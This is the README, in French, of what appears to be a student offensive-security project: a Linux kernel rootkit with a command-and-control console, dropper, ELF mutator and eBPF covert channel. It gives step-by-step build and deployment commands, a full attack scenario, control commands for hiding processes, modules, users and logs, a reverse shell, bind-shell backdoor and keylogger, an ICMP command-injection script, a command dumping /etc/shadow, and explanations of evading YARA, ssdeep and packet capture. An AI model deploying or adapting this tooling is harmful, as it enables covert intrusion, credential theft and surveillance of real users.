# Rootkit Linux

Projet de sécurité offensive : rootkit Linux sous forme de module noyau (LKM), avec C2 multi-protocole, obfuscation ELF et canal covert eBPF.

**Architecture** : x86-64 — **Interface** : `/dev/rootkit` (ioctl) + BPF maps

---

## Auteurs
**Alberick Mahoussi**
-  Développement de la structure de base du module et moteur de hooking (ftrace + kprobes)
-  Mise en place de la première méthode de communication entre le rootkit et les programmes compagnons par la création d'un périphérique avec misc
-  hooking des syscalls(``new_getdents64``, ``new_tcp4_seq_show``, `new_read`)
-  Implémentation du système de communication ioctl
-  Exécution d'une commande avec les droits root (privesc)
-  Masque d'un processus (hide pid)
-  Mise en place d'une backdoor par mise en place d'un socket TCP sur un port donnée et obtention d'un shell après vérification password 
-  Correction des bugs et refactor du code selon le coding style de l'ANSSI
  
**Mohand ACHERIR**
- Hooking de syscalls (ftrace + kprobes)
- Mécanismes de dissimulation : processus, fichiers, module, réseau, logs, utilisateurs
- Fonctionnalités offensives : privesc, backdoor, reverse shell, keylogger
- Protections : fichiers protégés, signal magique, canal de communication secondaire
- Programmes eBPF : XDP (filtrage réseau, C2 covert) + tracepoints (exec monitor)
- Interface userspace : ioctl + gestion via BPF maps

**Dr Shadyx**
- Obfuscation des strings sensibles (XOR compile-time, macro `DEOBFS`)
- C2 interactif multi-protocole (TCP, ICMP, HTTP, DNS) avec REPL
- Dropper : connexion au C2, réception du .ko, chargement via `finit_module`
- Metamorph : mutateur ELF (build-id, symboles, dead code, timestamps)
- Pipeline de build automatisé : compilation cross-kernel, nommage aléatoire
- Documentation et environnement de test (VM Alpine, disque partagé)

**Vignon HOUETO**
- Manipulation du système de fichiers depuis l'espace noyau via les primitives VFS
- Hijack de module légitime(binfmt_misc) permettant le camouflage
- Détournement de modprobe pour chargement au démarage 
- Indempotence et auto réparation si suppression de la persistence
- Dynamisation et développement du script d’automatisation de génération de la LFS et peuplement
- Mise en place des comptes utilisateurs (root / user) et configuration système
---

## Architecture

```
rootkit/
├── rootkit_module/      ← Module noyau + companion (ioctl) + dropper
│   └── ebpf/            ← Programmes eBPF (XDP, tracepoints)
├── c2/                  ← Console C2 interactive (REPL multi-protocole)
├── metamorph/           ← Mutateur ELF
└── linux-6.19.9/        ← Sources kernel cible (bzImage + headers)
```

---

## Build

```bash
cd rootkit_module

make modules    # compile le .ko (nom aléatoire → .rk_name)
make userspace  # compile le companion (nom aléatoire → .rk_bin_name)
make ebpf       # compile les programmes eBPF (nécessite clang)
make clean

# Dépendances eBPF
sudo apt install clang libbpf-dev libelf-dev
```

---

## Build — Headers kernel cible

Le module doit être compilé avec les headers du kernel qui tourne sur la cible. Le Makefile cherche d'abord un dossier `build-sys-linux-<KVER>/` à la racine du projet, sinon il utilise `/lib/modules/<KVER>/build`.

### Cas 1 — Kernel fourni (6.19.9)

Les sources sont dans `linux-6.19.9/`. Créer le lien symbolique attendu par le Makefile :

```bash
cd rootkit        # racine du projet
ln -sfn linux-6.19.9 build-sys-linux-6.19.9

cd rootkit_module
make modules KVER=6.19.9
```

### Compiler le kernel depuis les sources

Si tu as les sources complètes dans `linux-6.19.9/` :

```bash
cd linux-6.19.9

# Générer une config minimale x86_64
make defconfig

# Activer le réseau (pour tester le C2)
scripts/config --enable CONFIG_NET
scripts/config --enable CONFIG_INET
scripts/config --enable CONFIG_E1000       # driver NIC QEMU
scripts/config --enable CONFIG_NETDEVICES
make olddefconfig   # résoudre les dépendances

# Compiler (utilise tous les cœurs)
make -j$(nproc) bzImage

# Le kernel est ici
ls arch/x86/boot/bzImage
```

Pour installer les modules kernel dans un rootfs cible :
```bash
make modules -j$(nproc)
make modules_install INSTALL_MOD_PATH=/chemin/rootfs
```

---

### Cas 2 — Ubuntu / Debian

```bash
sudo apt install linux-headers-<KVER>
# ex: sudo apt install linux-headers-6.8.0-106-generic

make modules KVER=6.8.0-106-generic
```

### Cas 3 — Alpine Linux

```bash
KVER="6.12.79-0-virt"
wget "https://dl-cdn.alpinelinux.org/alpine/v3.21/main/x86_64/linux-virt-dev-6.12.79-r0.apk" \
    -O /tmp/alpine-headers.apk
mkdir -p /tmp/alpine-headers
tar -xzf /tmp/alpine-headers.apk -C /tmp/alpine-headers 2>/dev/null

ln -sfn /tmp/alpine-headers/usr/src/linux-headers-${KVER} \
    build-sys-linux-${KVER}

make modules KVER=${KVER}
```

### Cas 4 — Kernel inconnu (compilation sur la cible)

```bash
# Sur la cible (nécessite gcc + headers)
mount /dev/sdb /mnt
cd /mnt
make modules && make userspace
insmod $(cat .rk_name).ko
```

---

## Build — Machine victime (`command.sh`)

`command.sh` construit une image disque QEMU complète (Alpine + kernel 6.19.9 + SSH + réseau). À lancer **après** `make modules && make userspace` :

```bash
cd rootkit_module
make modules && make userspace   # génère .rk_name et .rk_bin_name

cd ..
./command.sh   # produit disk.img et disk.qcow2
```

Le script :
1. Crée une image disque ext4 de 2GB
2. Peuple un rootfs Alpine via Docker (openssh, build-base, libbpf…)
3. Configure SSH (`PermitRootLogin yes`, génère les clés hôtes, `/var/empty`)
4. Configure le réseau statique (eth0 → 10.0.0.2)
5. Copie le kernel (`linux-6.19.9/arch/x86/boot/bzImage`) et installe les modules
6. Copie le `.ko` (lu depuis `.rk_name`) dans `/root/rootkit/`
7. Installe GRUB
8. Convertit en `disk.qcow2` et configure TAP + NAT sur le host

```bash
# Lancer la VM générée
./run.sh

# Dans la VM
insmod /root/rootkit/<nom>.ko
rk_demo uid
```

---

## Clean

```bash
cd rootkit_module
make clean   # supprime .ko, .o, companion, gen_name, .rk_name, .rk_bin_name, eBPF
```

> `make clean` supprime aussi les noms générés. Relance `make modules && make userspace` avant `command.sh` ou tout déploiement.

---

## Scénario d'attaque complet

Prérequis : `./command.sh` exécuté, VM lancée avec `./run.sh`.

### 1. Accès initial — SSH sur la machine victime

```bash
ssh root@10.0.0.2
# mot de passe affiché à la fin de command.sh
```

### 2. Déposer le dropper sur la victime

```bash
# Sur l'attaquant — compiler le dropper (statique, compatible musl/glibc)
cd rootkit_module
make dropper C2_HOST=10.0.0.1 C2_PORT=4444

# Le nom généré est dans .rk_dropper_name, ex: power-manager-agent
scp $(cat .rk_dropper_name) root@10.0.0.2:/tmp/acpi-event-daemon
```

### 3. Lancer le C2 sur l'attaquant

```bash
cd c2 && make && ./c2
```

```
[c2] > set LPORT 4444
[c2] > run
# [*] En attente du dropper sur le port 4444...
```

### 4. Exécuter le dropper sur la victime

```bash
# Sur la victime (via SSH)
chmod +x /tmp/acpi-event-daemon
/tmp/acpi-event-daemon
```

Le dropper :
1. Récupère la version kernel (`uname -r`)
2. Se connecte au C2 sur `10.0.0.1:4444`
3. Envoie la version kernel

### 5. Le C2 build et envoie le rootkit

Le C2 automatiquement :
1. Compile le `.ko` pour la version kernel reçue
2. Compile le companion (statique)
3. Applique metamorph (mutations ELF) sur le `.ko`
4. Envoie le `.ko` puis le companion sur le même socket

Le dropper :
1. Reçoit le `.ko`, le charge via `finit_module`
2. Reçoit le companion, l'installe dans `/tmp/.polkit-agent` (exécutable)
3. S'auto-supprime

### 6. Rootkit actif — contrôle

Le companion a été installé automatiquement par le dropper dans `/tmp/.polkit-agent` :

```bash
# Sur la victime
/tmp/.polkit-agent uid           # doit retourner 0
/tmp/.polkit-agent hide_mod      # disparaître de lsmod
/tmp/.polkit-agent hide_pid $$   # cacher le shell courant
/tmp/.polkit-agent keylog_toggle # activer le keylogger
```

### 7. Post-exploitation via eBPF (canal covert)

```
[c2] > set TARGET 10.0.0.2
[c2] > exec cat /etc/shadow > /tmp/.out
[c2] > exec cat /tmp/.out
```

Les commandes transitent dans des paquets ICMP avec magic `0xDEAD1337` — aucune connexion TCP visible.

---

## Déploiement sans C2

```bash
# Sur la machine attaquante
cd rootkit_module
make modules KVER=<version_cible>
make userspace

# Les noms sont dans .rk_name et .rk_bin_name
# ex: disk-broker-manager.ko  et  session-handler-helper
scp $(cat .rk_name).ko     root@10.0.0.2:/tmp/
scp $(cat .rk_bin_name)    root@10.0.0.2:/tmp/

# Sur la cible
insmod /tmp/$(cat .rk_name).ko
/tmp/$(cat .rk_bin_name) uid
```

---

## Déploiement avec le C2

```bash
# Machine attaquante
cd c2 && make && cd ../metamorph && make metamorph
cd ../c2 && ./c2
```

```
[c2] > set LPORT 4444
[c2] > run
```

```bash
# Machine attaquante — compiler et envoyer le dropper
cd rootkit_module
make dropper C2_HOST=<IP> C2_PORT=4444
scp $(cat .rk_dropper_name) root@10.0.0.2:/tmp/acpi-event-daemon

# Machine cible — exécuter le dropper
ssh root@10.0.0.2 "chmod +x /tmp/acpi-event-daemon && /tmp/acpi-event-daemon"
```

### Protocoles disponibles

| Protocole | Usage |
|-----------|-------|
| `tcp`  | Dropper callback — C2 reçoit la connexion, envoie le .ko |
| `icmp` | Livraison covert dans des pings (magic `0xDEAD1337`) |
| `http` | Livraison déguisée en firmware update |
| `dns`  | Livraison fragmentée en enregistrements TXT |

### Commandes C2

| Commande | Description |
|----------|-------------|
| `set <opt> <val>` | Configurer une option |
| `show options` | Afficher la configuration |
| `run` | Lancer le pipeline |
| `exec <cmd>` | Envoyer une commande via ICMP covert |
| `exit` | Quitter |

---

## Companion — Contrôle du rootkit

Le companion (nom aléatoire, stocké dans `.rk_bin_name`) contrôle le module via ioctl :

```bash
./companion uid                        # UID courant
./companion hide_pid <pid>             # Cacher un PID de /proc
./companion unhide_pid <pid>
./companion hide_mod                   # Disparaître de lsmod / /sys/module
./companion show_mod                   # Réapparaître (nécessaire avant rmmod)
./companion privesc_cmd "id"           # Exécuter commande en root
./companion backdoor <port>            # Ouvrir backdoor TCP
./companion backdoor_pass <pass>       # Mot de passe backdoor
./companion revshell <ip:port>         # Reverse shell
./companion keylog_toggle              # Activer/désactiver keylogger
./companion keylog_read                # Lire le buffer keylogger
./companion hide_user <user>           # Cacher un user de /etc/passwd
./companion unhide_user
./companion protect <path>             # Protéger un fichier contre rm/mv
./companion unprotect <path>
./companion toggle                     # Toggle rootkit via signal magique
./companion msg <text>                 # Message canal secondaire
```

---

## Fonctionnalités du module

| # | Fonctionnalité | Hook |
|---|----------------|------|
| 1 | Dissimulation processus (jusqu'à 16 PIDs) | `getdents64` |
| 2 | Dissimulation fichiers / services | `getdents64` |
| 3 | Dissimulation module (`lsmod`, `/sys/module`, `/proc/modules`) | `read` + kobject |
| 4 | Dissimulation persistance (`/etc/rc.local`) | `read` |
| 5 | Filtrage logs (`dmesg`, `syslog`, `kern.log`) | `read` |
| 6 | Dissimulation connexions TCP/UDP | `tcp4_seq_show`, `udp4_seq_show` |
| 7 | Dissimulation utilisateur (`/etc/passwd`, `/etc/shadow`) | `read` |
| 8 | Escalade de privilèges par commande | ioctl → `call_usermodehelper` |
| 9 | Backdoor TCP (bind shell protégé par mot de passe) | socket kernel |
| 10 | Reverse shell | `call_usermodehelper` |
| 11 | Keylogger (buffer 4Ko, spinlock) | `input_handler` |
| 12 | Protection fichiers contre `rm`/`mv` | `unlinkat`, `renameat2` |
| 13 | Canal de communication secondaire | `read` |

---

## eBPF

Trois programmes eBPF indépendants du module kernel, chargés via `ebpf/rk_ebpf_loader` :

### XDP — Masquage réseau (`xdp_hide.bpf.c`)
Drop les paquets sur un port avant la couche de capture — invisible à tcpdump/Wireshark.
```bash
sudo ./ebpf/rk_ebpf_loader xdp_attach eth0
sudo ./ebpf/rk_ebpf_loader xdp_hide_port 9999
sudo ./ebpf/rk_ebpf_loader xdp_enable
```

### XDP — Canal C2 covert ICMP (`icmp_c2.bpf.c`)
Intercepte les pings contenant `0xDEAD1337`, exécute la commande embarquée, drop le paquet.
```bash
# Via C2 :
[c2] > exec id > /tmp/.rk_out

# Manuellement :
sudo python3 -c "
import struct, socket
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
magic = struct.pack('!I', 0xDEAD1337)
cmd = b'id > /tmp/.rk_out'
icmp = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + magic + cmd
s.sendto(icmp, ('<IP_cible>', 0))
"
```

### Tracepoint — Monitoring execve (`exec_monitor.bpf.c`)
Capture tous les `execve` en temps réel via ring buffer.
```bash
sudo ./ebpf/rk_ebpf_loader exec_watch
```

---

## Metamorph

Mutateur ELF appliqué automatiquement par le C2 avant livraison :

```bash
./metamorph <input> <output>        # binaire userspace
./metamorph <input> <output> --ko   # module kernel
```

| Transform | Effet |
|-----------|-------|
| `build-id` | Randomise le hash GNU build-id |
| `rename-syms` | Renomme les symboles locaux en `_fXXXX` |
| `dead-code` | Injecte du faux code x86-64 dans `.text` |
| `nuke-shdrs` | Efface la section header table |
| `bss-pad` | Augmente `.bss` de N octets aléatoires |
| `timestamps` | Forge mtime/atime entre −6 et −18 mois |
| `.comment` | Remplace la version GCC par une fausse |

---

## Pourquoi ces choix

**Obfuscation strings** — Les strings sensibles sont XOR'd au compile-time dans `.rodata`. `strings` et les scans statiques ne les voient pas. Décodage sur la stack via `DEOBFS()`, disparu à la fin du bloc.

**Metamorph** — Chaque build produit un binaire différent. YARA et ssdeep ne peuvent pas corréler deux exécutions.

**C2 multi-protocole** — Un seul outil unifie build, mutation et livraison. Le socket dropper est réutilisé pour l'envoi du `.ko` — une seule connexion sortante.

**eBPF XDP** — Le drop au niveau driver est antérieur à la couche `AF_PACKET`. Tcpdump et Wireshark ne voient jamais les paquets. Aucun module noyau supplémentaire requis.
